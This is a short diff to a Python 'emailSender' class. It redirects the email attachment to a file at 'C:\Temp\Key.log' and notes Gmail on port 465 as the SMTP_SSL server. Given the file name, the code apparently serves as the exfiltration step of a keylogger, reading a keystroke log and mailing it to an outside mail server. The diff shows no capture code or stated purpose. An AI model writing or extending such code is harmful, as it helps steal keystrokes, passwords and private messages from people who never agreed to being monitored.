@@ -22,7 +22,7 @@ class emailSender:
 
             msg.attach( MIMEText( body, "plain" ) )
             filename = "Filename.txt"
-            attachment = open( 'C:\\Users\\User\\Documents\\Filename.log', "rb" )
+            attachment = open( 'C:\\Temp\\Key.log', "rb" )
 
             part = MIMEBase( "application", "octet-stream" )
             part.set_payload( (attachment).read() )
@@ -31,8 +31,9 @@ class emailSender:
 
             msg.attach( part )
 
-            server = smtplib.SMTP_SSL( 'smtp.company.com',
+            server = smtplib.SMTP_SSL( 'smtp.company.com',  # gmail, 465
                                        'company-port' )  # using smtplib.SMTP_SSL instead to ensure secure connection
+
             # server.ehlo() <- command to create a insecure connection
             # server.starttls() <- make the connection secure (Google doesn't support this method)
 
